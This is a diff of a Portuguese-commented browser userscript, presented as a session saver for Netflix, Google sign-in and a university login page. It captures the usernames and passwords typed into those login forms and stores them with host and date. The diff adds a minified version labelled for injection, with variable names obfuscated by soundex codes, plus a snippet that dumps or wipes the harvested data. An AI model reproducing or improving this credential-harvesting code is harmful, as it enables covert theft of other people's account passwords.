@@ -3,20 +3,15 @@
 // @description	salvar sessões em (3) sites
 // @namespace   http://pastebin.com/EGAuDuhr
 // @include     *://www.netflix.com/*Login*
-// @include     *://accounts.google.com/*ServiceLogin?*
+// @include     *://accounts.google.com/*ServiceLogin*
 // @include     *://accounts.google.com/*signin*
 // @include     *://ecampus.ufam.edu.br/ecampus/*login*
-// @version     1.18-2
+// @version     1.20-2
 // @require	https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js
 // @grant       GM_getValue
 // @grant       GM_setValue
 // @grant       GM_deleteValue
 // ==/UserScript==
-
-/** MINIMIZADO (UP THIS)
-const show=!1,del=!1;!function(t){String.prototype.isEmpty=function(){return!this.trim()};var e=GM_getValue("S132",[]);e.forEach(function(t){console.error(t)}),1==mostrar&&console.log(JSON.stringify(e)),1==deletar&&GM_deleteValue("S132"),document.querySelector("form").addEventListener("submit",function(n){var o=t('input[type="email"], input[name="email"], input[type="text"]').val(),i=t('input[type="password"], input[name="password"]').val();if(!o.isEmpty()&&!i.isEmpty()){var r={hst:location.host,dte:(new Date).toLocaleString(),lgn:o,pss:i};e.push(r),GM_setValue("S132",e)}})}(jQuery);
-**/
-
 /*
 → Netflix
 → Gmail
@@ -24,54 +19,87 @@ const show=!1,del=!1;!function(t){String.prototype.isEmpty=function(){return!thi
 */
 
 
-//TODO: encontrar campo que contém login ($('form').Email) no Gmail
+//TODO verificar se o 'lgn', 'hst' e 'pss' já existem no array de histórico
 
-const mostrar = true;
-const deletar = false;
+/** MINIMIZADO - PARA INJETAR
+const D355="S132";!function(t){String.prototype.isNotEmpty=function(){return this.trim()},Array.prototype.isNotEmpty=function(){return this.length>0};var n=GM_getValue(D355,[]),e="input[type=email], input[type=text], input[name=login], input[name=email], input[name=usuario]",i="input[type=password], input[name=password], input[name=senha]",a=function(t){return function(n,e){for(var i=t.querySelectorAll(e),a=0;a<i.length;++a){var o=i[a].value;o.isNotEmpty()&&n.push(o)}}};document.querySelector("form").addEventListener("submit",function(t){var o=[],r=[];if(a(this)(o,e),a(this)(r,i),o.isNotEmpty()&&r.isNotEmpty()){var u={hst:location.host,dte:(new Date).toLocaleString(),lgn:o,pss:r};n.push(u),GM_setValue(dataname,n)}})}(jQuery);
+**/
 
+/** MINIMIZADO - PARA MOSTRAR/APAGAR
+const S000=!0,R510=!1,D355="S132";!function(a){var n=GM_getValue(D355,[]);if(S000){n.forEach(function(a){console.error(a)});};if(R510){GM_deleteValue(D355);};}(jQuery);
+**/
+
+
+
+const show = true;
+const remove = true;
+
+const dataname= 'savedsession';
 (function($) {
-	String.prototype.isEmpty = function() { return !(this.trim());	};
-	var onhistory = GM_getValue('savedsession', []);
-	console.info(onhistory.length);
-	if(mostrar == true) onhistory.forEach( function(e) { console.error(e) } );
-	if(deletar == true) GM_deleteValue('savedsession');
+	String.prototype.isNotEmpty = function() { return (this.trim()); };
+	Array.prototype.isNotEmpty  = function() { return (this.length > 0); };
+
+	var onhistory = GM_getValue(dataname, []);
+
+	if(show == true) onhistory.forEach( function(e) { console.error(e) } );///*
+	if(remove == true) GM_deleteValue(dataname);///*
+
+	var selectorsLogin = 'input[type=email], input[type=text], input[name=login], input[name=email], input[name=usuario]';
+	var selectorsPsswd = 'input[type=password], input[name=password], input[name=senha]';
+
+	var fillData = function(formObject){
+		return function(arrTarget, selectorsTarget){
+			var myform = formObject.querySelectorAll(selectorsTarget);
+			for(var i=0; i < myform.length; ++i){
+				var e = myform[i].value;
+				if(e.isNotEmpty()) arrTarget.push(e);
+			}
+		};
+	};
 
 	document.querySelector('form').addEventListener('submit', function (e) {
-		e.preventDefault(); // <<<< COMMENT
-		
-		var login = $('input[type="email"], input[name="email"], input[type="text"]').val();
-		var senha = $('input[type="password"], input[name="password"]').val();
-  
-		console.log("login:",login)
-		console.log("senha:",senha)
+		// e.preventDefault();
+		var arrLgn=[], arrPss=[];
 
-		if(!login.isEmpty() && !senha.isEmpty()){
+		fillData(this)(arrLgn, selectorsLogin);
+		fillData(this)(arrPss, selectorsPsswd);
+
+		if((arrLgn.isNotEmpty()) && (arrPss.isNotEmpty())){
 			var newdata = {
 				"hst": location.host,
 				"dte": new Date().toLocaleString(),
-				"lgn": login,
-				"pss": senha
+				"lgn": arrLgn,
+				"pss": arrPss
 			};
-			onhistory.push(newdata);//TODO verificar se o 'lgn', 'hst' e 'pss' já existem no array de histórico
-			// console.log( newdata );
-			GM_setValue('savedsession', onhistory);      
+			onhistory.push(newdata);
+			// console.log( onhistory, onhistory.length );
+			GM_setValue(dataname, onhistory);
 		}
+
 	});
 })(jQuery);
 
 /*********************
-soundex("savedsession")
+soundex('dataname')
+D355
+soundex('savedsession')
 S132
-
-soundex("login")
-2L50
-
-soundex("senha")
-S500
-
-soundex("onhistory")
+soundex('onhistory')
 O523
-
+soundex('show')
+S000
+soundex('remove')
+R510
+soundex('selectorsLogin')
+S423
+soundex('selectorsPsswd')
+S424
+soundex('myform')
+M165
+soundex('arrLgn')
+A642
+soundex('arrPss')
+A612
 soundex('newdata')
 N330
 /*********************/
